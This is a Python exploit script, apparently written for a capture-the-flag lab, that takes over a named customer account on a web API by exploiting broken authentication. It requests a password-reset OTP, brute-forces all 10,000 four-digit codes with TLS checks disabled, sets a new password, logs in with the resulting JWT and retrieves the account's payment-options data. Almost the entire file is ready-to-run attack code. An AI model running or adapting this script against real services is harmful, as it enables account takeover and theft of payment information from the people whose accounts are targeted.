"""
---------------------------
Broken Authentication Exploit
---------------------------

Exploit another Broken Authentication vulnerability to gain unauthorized access
to the customer with the email 'MasonJenkins@ymail.com'.

Steps Performed:
1. Trigger an OTP reset request.
2. Brute-force the OTP (0000–9999).
3. Reset the customer password.
4. Authenticate with the new password.
5. Retrieve payment-options data and extract the flag.
"""

import requests
import sys
from colorama import Fore, Style

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

TARGET_EMAIL = "MasonJenkins@ymail.com"
NEW_PASSWORD = "NewPass123"

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} target_ip")
        print(f"Example: {sys.argv[0]} 94.237.49.128:48293")
        sys.exit(1)

    target = sys.argv[1].strip().rstrip("/")
    base = f"http://{target}"

    otp_request_url = f"{base}/api/v1/authentication/customers/passwords/resets/email-otps"
    otp_reset_url = f"{base}/api/v1/authentication/customers/passwords/resets"
    login_url = f"{base}/api/v1/authentication/customers/sign-in"
    payment_url = f"{base}/api/v1/customers/payment-options/current-user"

    headers = {"accept": "application/json", "Content-Type": "application/json"}

    # ============================ STEP 1: TRIGGER OTP ============================ #
    print("\n===== Requesting OTP for Password Reset =====")
    r = requests.post(
        otp_request_url,
        headers=headers,
        json={"Email": TARGET_EMAIL},
        verify=False
    )
    print_response(r)

    # ============================ STEP 2: BRUTE FORCE OTP ============================ #
    print("\n===== Brute-forcing OTP (0000–9999) =====")

    found_otp = None

    for otp in range(0, 10000):
        otp_code = f"{otp:04d}"

        r = requests.post(
            otp_reset_url,
            headers=headers,
            json={
                "Email": TARGET_EMAIL,
                "OTP": otp_code,
                "NewPassword": NEW_PASSWORD
            },
            verify=False
        )
        print("\nRESPONSE TO REQUEST: \n", r)
        # Successful reset response is size != 23 typically
        if len(r.text) != 23 and r.status_code == 200:
            found_otp = otp_code
            print(f"\n[+] VALID OTP FOUND: {otp_code}")
            break

    if not found_otp:
        print("[-] No valid OTP found.")
        sys.exit(2)

    # ============================ STEP 3: LOGIN WITH NEW PASSWORD ============================ #
    print("\n===== Logging in with Reset Credentials =====")

    login_resp = requests.post(
        login_url,
        headers=headers,
        json={"Email": TARGET_EMAIL, "Password": NEW_PASSWORD},
        verify=False
    )
    print_response(login_resp)

    token = login_resp.json().get("jwt")
    if not token:
        print("[-] Failed to obtain JWT token.")
        sys.exit(3)

    headers_jwt = {"accept": "application/json", "Authorization": f"Bearer {token}"}

    # ============================ STEP 4: RETRIEVE PAYMENT OPTIONS ============================ #
    print("\n===== Retrieving Payment Options (FLAG) =====")

    payment_resp = requests.get(payment_url, headers=headers_jwt, verify=False)
    print_response(payment_resp)

    print("\n===== FLAG (Search Output Above) =====\n")


# ============================================================================ #
# CUSTOM OUTPUT FORMATTERS (PRESERVED EXACT FROM YOUR STYLE)
# ============================================================================ #

def print_response(r):
    print("\n======= Johnny Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("RESPONSE STATUS:", r.status_code))
    print(format_text("RESPONSE CONTENT LENGTH:", len(r.text)))
    print(format_text("RESPONSE BODY:", r.text[:600]))


def format_text(title, item):
    cr = '\r\n'
    section_break = cr + "*" * 20 + cr
    return (
        Style.BRIGHT + Fore.RED + title + Fore.RESET +
        section_break + str(item) + section_break + '\t'
    )


if __name__ == "__main__":
    main()

